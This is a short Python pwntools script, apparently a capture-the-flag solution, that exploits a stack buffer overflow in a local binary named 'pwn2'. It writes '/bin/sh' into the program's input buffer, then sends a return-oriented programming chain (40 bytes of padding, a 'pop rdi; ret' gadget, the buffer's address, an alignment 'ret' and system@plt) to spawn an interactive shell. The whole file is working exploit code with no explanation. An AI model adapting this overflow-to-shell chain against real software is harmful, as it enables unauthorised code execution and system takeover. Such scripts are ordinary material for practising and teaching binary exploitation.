#!/usr/bin/python3

from pwn import *

elf = ELF("./pwn2")
rop = ROP("./pwn2")


io = elf.process()

io.sendline(b"/bin/sh")

pop_rdi = rop.find_gadget(["pop rdi","ret"])[0]

payload = flat([
b"A"*40,
p64(pop_rdi),
p64(elf.symbols.input),
p64(rop.find_gadget(['ret'])[0]),
p64(elf.plt.system),
])

io.sendline(payload)

print("heres the input ",hex(elf.symbols.input))
io.interactive()
print(io.recvline())    
